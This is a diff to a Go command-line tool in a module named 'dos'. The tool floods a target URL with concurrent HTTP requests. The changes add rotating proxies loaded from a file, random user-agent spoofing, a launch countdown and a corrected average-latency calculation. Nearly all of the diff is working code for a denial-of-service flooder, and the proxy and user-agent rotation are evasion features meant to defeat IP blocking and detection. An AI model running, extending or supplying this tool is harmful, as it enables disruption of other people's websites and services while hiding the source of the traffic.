@@ -2,8 +2,11 @@ package main
 
 import (
 	"context"
+	"dos/internal/proxy"
+	"dos/internal/util"
 	"flag"
 	"fmt"
+	"math/rand"
 	"net/url"
 	"os"
 	"os/signal"
@@ -20,21 +23,25 @@ import (
 )
 
 var (
-	version              = ""
-	printVersion         = flag.Bool("version", false, "print version")
-	targetURL            = flag.String("url", "", "url address of target to send requests to")
-	method               = flag.String("method", fasthttp.MethodGet, "HTTP method to use")
-	delayBetweenRequests = flag.Duration("delay", 0, "delay between requests")
-	maxGoroutines        = flag.Int("max_goroutines", 10, "limit of maximum goroutines count")
-	requestTimeout       = flag.Duration("request_timeout", time.Second, "timeout for each request")
-	logLevel             = flag.String("lvl", "info", "log level")
-	userAgent            = flag.String("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "user-agent used for requests")
-	executionTime        = flag.Duration("exec_time", 0, "total duration of execution")
-	prettyLog            = flag.Bool("pretty", false, "enable pretty logging")
+	version                = ""
+	printVersion           = flag.Bool("version", false, "print version")
+	targetURL              = flag.String("url", "", "url address of target to send requests to")
+	method                 = flag.String("method", fasthttp.MethodGet, "HTTP method to use")
+	delayBetweenRequests   = flag.Duration("delay", 0, "delay between requests")
+	maxGoroutines          = flag.Int("max_goroutines", 10, "limit of maximum goroutines count")
+	requestTimeout         = flag.Duration("request_timeout", time.Second*10, "timeout for each request")
+	logLevel               = flag.String("lvl", "info", "log level")
+	userAgent              = flag.String("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "user-agent used for requests")
+	userAgentsListFile     = flag.String("user_agents_list", "", "path to file with list of user agents. Will use default user agent if not provided")
+	executionTime          = flag.Duration("exec_time", 0, "total duration of execution")
+	prettyLog              = flag.Bool("pretty", false, "enable pretty logging")
+	proxyList              = flag.String("proxy_list", "", "path to file with list of proxies")
+	startingTimeoutSeconds = flag.Int("starting_timeout", 3, "timeout for starting in seconds")
 
-	client  = &fasthttp.Client{}
-	log     zerolog.Logger
-	limiter *rate.Limiter
+	client        *fasthttp.Client
+	log           zerolog.Logger
+	limiter       *rate.Limiter
+	userAgentList []string
 )
 
 func main() {
@@ -52,16 +59,43 @@ func main() {
 	}
 	zerolog.TimeFieldFormat = zerolog.TimeFormatUnix
 
-	if *delayBetweenRequests != 0 {
-		limiter = rate.NewLimiter(rate.Every(*delayBetweenRequests), 1)
-	}
-
 	lvl, err := zerolog.ParseLevel(*logLevel)
 	if err != nil {
 		log.Fatal().Timestamp().Err(err).Send()
 	}
 
 	zerolog.SetGlobalLevel(lvl)
+
+	if *userAgentsListFile != "" {
+		var err error
+		userAgentList, err = util.ReadFileEntries(*userAgentsListFile)
+		if err != nil {
+			log.Fatal().Err(err).Timestamp().Msg("Failed to read user agent list")
+		}
+		log.Info().Timestamp().Msg("Parsed user agents list")
+	} else {
+		log.Info().Timestamp().Msg("No user agents list provided, using default user agent")
+	}
+
+	if *proxyList != "" {
+		proxies, err := util.ReadFileEntries(*proxyList)
+		if err != nil {
+			log.Fatal().Err(err).Timestamp().Msg("Failed to read proxy list")
+		}
+		log.Info().Timestamp().Int("proxies-count", len(proxies)).Msg("Validating proxy list")
+		validProxies, _ := proxy.ValidateProxies(proxies)
+		log.Info().Timestamp().Str("valid-proxies", fmt.Sprintf("%d/%d", len(validProxies), len(proxies))).Msg("Validated proxy list")
+
+		client = proxy.NewProxyRotator(validProxies).GetClient()
+		log.Info().Timestamp().Msg("Using proxy list")
+	} else {
+		log.Info().Timestamp().Msg("No proxy list provided, using direct connection")
+		client = &fasthttp.Client{}
+	}
+
+	if *delayBetweenRequests != 0 {
+		limiter = rate.NewLimiter(rate.Every(*delayBetweenRequests), 1)
+	}
 
 	if _, err := url.Parse(*targetURL); err != nil {
 		log.Fatal().Err(err).Timestamp().Str("url", *targetURL).Err(err).Msg("Invalid targetURL")
@@ -91,10 +125,11 @@ func main() {
 	startedAt := time.Now()
 	wg := &sync.WaitGroup{}
 
-	templateReq := prepareRequest(*targetURL, *method, *userAgent)
-	defer fasthttp.ReleaseRequest(templateReq)
-
 	log.Info().Timestamp().Str("url", *targetURL).Msg("Sending requests to target")
+	for i := *startingTimeoutSeconds; i > 0; i-- {
+		log.Info().Timestamp().Msg(fmt.Sprintf("Starting execution in %d second(s)", i))
+		time.Sleep(time.Second)
+	}
 
 	go func() {
 		for {
@@ -106,7 +141,7 @@ func main() {
 				}
 				select {
 				case sem <- struct{}{}:
-					go sendRequest(ctx, sem, respChan, templateReq, *requestTimeout)
+					go sendRequest(ctx, sem, respChan, *requestTimeout)
 				case <-ctx.Done():
 					return
 				}
@@ -132,7 +167,7 @@ func main() {
 
 	var avgDuration float64
 	if sentRequestCount > 0 {
-		avgDuration = float64(sentRequestCount / totalDuration)
+		avgDuration = float64(totalDuration) / float64(sentRequestCount)
 	}
 	rps := float64(sentRequestCount) / time.Since(startedAt).Seconds()
 
@@ -145,7 +180,7 @@ type Result struct {
 	duration time.Duration
 }
 
-func sendRequest(ctx context.Context, sem <-chan struct{}, respChan chan<- *Result, templateReq *fasthttp.Request, requestTimeout time.Duration) {
+func sendRequest(ctx context.Context, sem <-chan struct{}, respChan chan<- *Result, requestTimeout time.Duration) {
 	defer func() {
 		select {
 		case <-sem:
@@ -156,7 +191,15 @@ func sendRequest(ctx context.Context, sem <-chan struct{}, respChan chan<- *Resu
 
 	start := time.Now()
 	req := fasthttp.AcquireRequest()
-	templateReq.CopyTo(req)
+	req.SetRequestURI(*targetURL)
+	req.Header.SetMethod(*method)
+
+	if len(userAgentList) > 0 {
+		randomUserAgent := userAgentList[rand.Intn(len(userAgentList))]
+		req.Header.SetUserAgent(randomUserAgent)
+	} else if *userAgent != "" {
+		req.Header.SetUserAgent(*userAgent)
+	}
 
 	resp := fasthttp.AcquireResponse()
 	err := client.DoTimeout(req, resp, requestTimeout)
@@ -187,12 +230,4 @@ func processResponse(res *Result, errCount, sentRequestsCount, totalDuration *in
 	atomic.AddInt64(sentRequestsCount, 1)
 	atomic.AddInt64(totalDuration, int64(res.duration))
 	log.Debug().Timestamp().Int("status", res.status).Dur("duration", res.duration).Send()
-}
-
-func prepareRequest(url, method, userAgent string) *fasthttp.Request {
-	req := fasthttp.AcquireRequest()
-	req.SetRequestURI(url)
-	req.Header.SetMethod(method)
-	req.Header.SetUserAgent(userAgent)
-	return req
 }
